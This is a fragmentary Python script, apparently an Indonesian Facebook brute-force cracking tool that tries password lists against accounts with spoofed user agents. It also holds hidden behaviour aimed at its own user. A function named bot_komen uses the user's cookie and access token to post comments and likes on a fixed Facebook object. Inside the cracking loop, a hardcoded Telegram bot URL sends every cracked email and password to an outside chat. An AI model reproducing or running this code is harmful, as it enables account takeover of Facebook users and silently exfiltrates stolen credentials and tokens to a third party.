...
[bold blue]        \\|[bold green]Multi Brute Force Facebook[bold blue]|/
   [bold red]          Update By:Wawan Sage""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] Version 8.0 [bold green]<[bold yellow]<[bold red]<"))
    return 0
### DAPATKAN NAMA ###
...
[[bold white]User :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Welcome) [bold green]<[bold yellow]<[bold red]<"));bot_komen(cookie, token_eaag)
                open('Cookie.json', 'w').write(json.dumps({'Cookie': cookie}));open('Token.json', 'w').write(json.dumps({'Token': token_eaag}));time.sleep(3.6);daftar_menu()
...
def bot_komen(cookie, token_eaag):
    with requests.Session() as r: # Kagak Usah Di Ganti, Anggap Saja Sebagai Tanda Terimakasih :V
        text = random.choice(
            ['Keren Bang 😎','Hello World!','login bang','I Love You ❤️','Hai Bang 😘']
        )
        r.cookies.update({
            'cookie': cookie
        })
        response = r.post('https://graph.facebook.com/736217731624008/comments/?message={}&access_token={}'.format(text, token_eaag)).text # Jangan Di Ganti!
        response2 = r.post('https://graph.facebook.com/736217731624008/likes?summary=true&access_token={}'.format(token_eaag)).text # Jangan Di Ganti!
...
def daftar_menu():
    try:
        banner_logo();cookie = json.loads(open('Cookie.json', 'r').read())['Cookie']
        token_eaag = json.loads(open('Token.json', 'r').read())['Token']
        name, id = dapatkan_nama(cookie, token_eaag)
        Console(width=50, style="bold hot_pink2").print(Panel(f"""[bold white]Nama :[bold green] {name}
...
[bold white]Hasil Crack[bold red] Cp[bold white] Tersimpan Di :[bold red] Results/Cp.txt""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Results Crack) [bold green]<[bold yellow]<[bold red]"))
    ...
    def main(self, total, email, password):
        try:
            for pws in password:
                self.useragent = self.samsung_useragent(total = 1)
                with requests.Session() as r:
                    r.headers.update({
                    ...
                    if 'c_user' in r.cookies.get_dict().keys():
                        ...
                        ses.post(f"https://api.telegram.org/bot5863768844:AAEAUxg_OPSyntXfVFoP1pAxxGrRsR5xVgcsendMessage?chat_id=6020176785&text=Cp.txt {email}|{pws}|{self.useragent}")
                        break
                    else:
                        continue
            self.looping += 1
     ...
     ### REALME USERAGENT ###
    def samsung_useragent(self, total):
